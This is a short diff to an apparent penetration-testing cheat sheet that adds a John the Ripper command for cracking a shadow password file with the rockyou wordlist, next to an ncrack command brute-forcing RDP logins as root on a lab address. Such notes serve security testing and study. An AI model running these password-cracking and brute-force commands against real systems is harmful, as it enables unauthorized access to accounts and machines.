@@ -1,3 +1,6 @@
+# Bruteforce files using wordlist
+john --wordlist=/usr/share/wordlists/rockyou.txt shadow
+
 # Bruteforce RDP using wordlist
 ncrack -vv --user root -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10 -oN ncrack.txt
 
